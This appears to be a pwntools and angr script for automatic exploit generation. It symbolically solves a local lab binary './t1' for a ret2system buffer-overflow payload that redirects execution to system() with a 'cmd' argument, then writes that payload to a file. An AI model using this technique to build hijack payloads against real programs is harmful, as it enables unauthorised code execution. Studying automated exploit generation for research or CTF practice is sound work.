from pwn import *
import setting
import gadgets
import angr, claripy
import code

base = setting.Base('./t1', mx_len=0x50)
base.find_unconstrained()
system_addr = base.p.loader.main_object.plt["system"]
binsh = base.p.loader.find_symbol("cmd").rebased_addr

assert system_addr is not None

sym_stdin_list = list(base.stdin_data.variables)
for ust in base.expst:
	ust.solver.add(ust.regs.pc == system_addr)
	payload = ust.posix.dumps(0)
	system_idx = payload.index(p32(system_addr))
	args = system_idx+8
	binsh = p32(binsh)
	payload = list(payload)	# for assignment, change to list
	for i in range(4):
		payload[system_idx+8+i] = binsh[i]
	payload = bytes(payload)
	with open('exp', 'wb') as f:
		f.write(payload)
	
#code.interact(local=locals())

